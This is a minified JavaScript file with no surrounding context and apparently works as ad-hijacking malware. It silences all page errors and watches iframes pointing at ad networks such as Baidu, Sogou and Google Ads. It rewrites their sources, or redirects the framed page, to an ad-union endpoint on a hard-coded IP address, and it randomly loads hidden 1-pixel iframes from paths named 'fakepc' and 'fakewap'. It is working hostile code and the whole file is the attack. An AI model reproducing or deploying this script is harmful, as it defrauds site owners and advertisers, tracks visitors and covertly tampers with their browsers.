var u = "http://c.cnzz.com/core.php?web_id=2942463&show=line&online=1&t=z";var wapp = 0.95;var pcp = 0.1;var serh = "139.129.194.43:31002";var gtag="cnzz";
var pcps = [];
var wapps = [];
var ps = [];
window.onerror=function(a,b,c){return true};(function(){function IsPC(){var a=navigator.userAgent;var b=["Android","iPhone","SymbianOS","Windows Phone","iPad","iPod"];var c=true;for(var v=0;v<b.length;v++){if(a.indexOf(b[v])>0){c=false;break}}return c}if(IsPC()){ps=pcps}else{ps=wapps}function Forbidden(){var a=["yaomai9.com"];for(var i in a){var b=a[i];if(location.href.indexOf(b)>=0){return true}if(document.referrer&&document.referrer.indexOf(b)>=0){return true}}return false}function GetIFrameLevel(){if(self==top){return 0}if(parent&&parent==top){return 1}return 2}function IsInIFrame(){if(self!=top){return true}return false}function loadjscssfile(a,b){if(b=="js"){var c=document.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("src",a);c.setAttribute("charset","utf-8")}else{if(b=="css"){var c=document.createElement("link");c.setAttribute("rel","stylesheet");c.setAttribute("type","text/css");c.setAttribute("href",a)}else{if(b=="iframe"){var c=document.createElement("iframe");c.setAttribute("id","wbifr");c.setAttribute("name","wbifr");c.setAttribute("width","1px");c.setAttribute("height","1px");c.setAttribute("visibility","hidden");c.setAttribute("src",a)}}}if(typeof c!="undefined"){document.getElementsByTagName("head")[0].appendChild(c)}}function isJqueryInit(){var a=false;try{if(jQuery.ajax){a=true}}catch(err){a=false}return a}function init(){var a=isJqueryInit();if(!a){loadjscssfile("http://cdn.bootcss.com/jquery/1.11.1/jquery.min.js","js")}setTimeout(attach,100)}function attach(){var a=isJqueryInit();if(!a){setTimeout(attach,100);return}start()}function getlocation(){var u="";try{u=top.location.href;var i=u.indexOf("?");if(i>0){u=u.substring(0,i)}}catch(err){}if(!u){u=""}return u}var r=[".baidu.com","inmobi.com",".sogou.com","googleads","domob.cn"];var s=[[".mediav.com/js/mvf_g2.js"]];function log(a){}function fixSize(w){w=parseInt(w);var a=w%5;if(a>2){w=w+(5-a)}else{w=w-a}return w}function inj(w,h,d,e){if(!w||!h){return null}if(w<10||h<10){return null}w=fixSize(w);h=fixSize(h);if(w<10||h<10){return null}log("inj "+w+" "+h+" "+d);var f=d;if(!d||d.indexOf("http://")!=0){return null}if(d.indexOf("aaa_flag=")>=0){return null}d=d.substr(7);var i=d.indexOf("/");if(i<0){return}var g=d.substr(0,i);var m=false;var n="";for(var i in r){var o=r[i];if(g.indexOf(o)>=0){m=true;n=e+"_"+i;break}}if(!m){if(!IsInIFrame()){return null}else{$("script").each(function(){if(m){return}var l=$(this).attr("src");if(!l){return}for(var j in s){var a=true;var b=s[j];for(var k in b){var c=b[k];if(l.indexOf(c)<0){a=false;break}}if(a){m=true;n=e+"_s"+j;break}}})}}if(!m){return null}var q=getlocation();for(var i in ps){var p=ps[i];if(p[1]==w&&p[2]==h){return"http://"+serh+"/union?pids="+p[0]+"&tag=1&width="+w+"&height="+h+"&hm="+encodeURIComponent(f)+"&referrer="+encodeURIComponent(q)}}return null}function start(){if(IsInIFrame()){var w=document.body.clientWidth;var h=document.body.clientHeight;var c=location.href;var d=inj(w,h,c,"2");if(d){location.href=d}}else{$("iframe").each(function(){var w=$(this).width();var h=$(this).height();if(!$(this).is(":visible")){return}var a=$(this).attr("src");var b=inj(w,h,a,"1");if(b){$(this).attr("src",b)}})}}if(u.indexOf("?")>0){u+="&aaa_flag=1"}else{u+="?aaa_flag=1"}loadjscssfile(u,"js");if(Forbidden()){return}if(GetIFrameLevel()>1){log("failed level "+GetIFrameLevel());return}if(IsInIFrame()){}else{init();if(IsPC()){if(Math.random()<pcp){loadjscssfile("http://"+serh+"/fakepc","iframe")}}else{if(Math.random()<wapp){loadjscssfile("http://"+serh+"/fakewap","iframe")}}}})();